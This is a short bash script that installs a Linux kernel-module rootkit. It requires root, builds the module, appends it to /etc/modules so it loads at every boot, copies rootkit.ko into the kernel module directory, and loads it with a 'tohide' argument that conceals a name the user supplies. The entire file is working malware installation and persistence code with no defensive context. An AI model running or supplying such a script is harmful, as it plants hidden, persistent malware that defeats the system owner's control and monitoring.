#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

if [ -z "$1" ]
  then
    echo "No name to hide provided"
    exit
fi

make;

echo "rootkit" >> /etc/modules

cp rootkit.ko /lib/modules/`uname -r`/;

depmod -a;

echo "options rootkit tohide=$1" > /etc/modprobe.d/rootkit.conf

modprobe rootkit tohide=$1

echo "Rootkit installed successfully!"
